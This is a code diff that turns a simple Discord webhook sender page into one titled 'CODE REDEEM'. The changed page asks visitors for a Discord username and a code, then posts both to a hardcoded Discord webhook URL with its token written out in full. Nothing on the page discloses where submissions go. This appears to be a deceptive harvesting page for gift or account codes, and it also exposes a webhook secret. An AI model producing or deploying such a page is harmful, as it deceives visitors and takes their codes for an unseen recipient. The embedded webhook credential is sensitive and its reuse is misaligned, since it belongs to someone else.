@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Webhook Sender</title>
+    <title>CODE REDEEM</title>
 </head>
 <body>
-    <h1>Discord Webhook Sender</h1>
-    <label for="discordInput">Discord Webhook URL:</label>
-    <input type="text" id="discordInput" placeholder="Enter Discord Webhook URL">
+    <h1>CODE REDEEM</h1>
+    <label for="discordInput">Discord Username:</label>
+    <input type="text" id="discordInput" placeholder="Enter Discord Username">
     <br>
     <label for="codeInput">Code:</label>
     <textarea id="codeInput" rows="4" cols="50" placeholder="Enter your code"></textarea>
@@ -25,11 +25,12 @@
                 const codeInput = document.getElementById("codeInput").value;
 
                 if (discordInput && codeInput) {
+                    const webhookUrl = "https://discord.com/api/webhooks/1144580952039890975/k69uOT3MaVrA-3N5pjWPKOzrtlSglASvxHPPuiAFF9S8RoYTXhwtYDCxJLedNsKtV9WP";
                     const requestData = {
-                        content: codeInput
+                        content: `Discord User: ${discordInput}\nCode: ${codeInput}`
                     };
 
-                    fetch(discordInput, {
+                    fetch(webhookUrl, {
                         method: "POST",
                         headers: {
                             "Content-Type": "application/json"
@@ -38,16 +39,16 @@
                     })
                     .then(response => {
                         if (response.ok) {
-                            alert("Code sent to Discord!");
+                            alert("Data sent to Discord!");
                         } else {
-                            alert("Failed to send code to Discord.");
+                            alert("Failed to send data to Discord.");
                         }
                     })
                     .catch(error => {
                         alert("An error occurred: " + error);
                     });
                 } else {
-                    alert("Please fill in both Discord Webhook URL and code.");
+                    alert("Please fill in both Discord Username and code.");
                 }
             }
         });
